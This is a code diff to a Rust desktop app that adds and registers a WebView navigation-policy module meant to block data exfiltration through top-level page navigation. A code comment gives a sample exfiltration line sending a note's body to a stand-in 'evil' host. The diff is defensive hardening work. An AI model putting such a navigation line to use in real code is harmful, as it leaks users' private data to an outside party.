@@ -26,6 +26,11 @@ pub use myne_core::export_naming;
 // pdf/workspace/screen-capture/sync) that do not live in `myne-core`.
 mod hooks;
 pub use myne_core::io_failure_kind;
+// App-global WebView navigation policy (myne#383). The CSP has no directive
+// that governs a top-level navigation, so `location = "https://evil/?d=" +
+// noteBody` is outside every policy this app can write there. This module is
+// that missing directive; it registers no commands and so needs no ACL wiring.
+mod navigation;
 // App-global no-egress invariant + static CI gate (local-ai epic,
 // ai-egress-guardrail MYND-407). NOT AI-scoped — the whole client must never
 // gain a network egress path. The canonical lists + pure predicates and the
@@ -270,6 +275,13 @@ pub fn run() {
     }));
 
     let builder = builder
+        // myne#383: the app-global navigation policy, registered FIRST so the
+        // rule about what may load precedes every plugin that can cause a load.
+        // Order is functionally irrelevant — the plugin store is read at
+        // navigation time and fans out AND-style — but this is the one hook
+        // that reaches the config-declared `main` window, and it reads as the
+        // gate it is where it sits.
+        .plugin(navigation::init())
         // MYND-567: `myne://` custom-URL-scheme delivery. COLD START needs no
         // wiring of ours — the plugin's own `init` already feeds `std::env::args()`
         // to `handle_cli_arguments` on desktop, which is what makes the WebView's
